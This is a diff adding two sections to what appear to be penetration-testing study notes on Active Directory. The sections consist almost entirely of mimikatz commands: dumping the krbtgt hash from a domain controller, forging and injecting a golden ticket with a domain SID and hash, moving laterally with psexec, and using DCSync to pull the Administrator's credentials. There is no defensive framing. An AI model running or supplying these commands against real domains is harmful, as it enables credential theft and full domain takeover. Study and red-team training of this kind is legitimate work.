@@ -209,4 +209,26 @@ See other documented notes for remaining details.
 
 ### Golden Tickets
 
+```powershell
+# From a compromised machine
+psexec.exe \\dc01 cmd.exe  # Failed attempt to laterally move (access denied)
+# From the Domain Controller
+mimikatz.exe
+privilege::debug
+lsadump::lsa /patch
+# Identify krbtgt user and grab the NTLM Hash
+# Back on compromised machine
+mimikatz.exe
+privilege::debug
+kerberos::purge
+kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+misc::cmd
+psexec.exe \\dc01 cmd.exe
+```
+
 ### Domain Controller Synchronization
+
+```powershell
+mimikatz.exe
+lsadump::dcsync /user:Administrator
+```
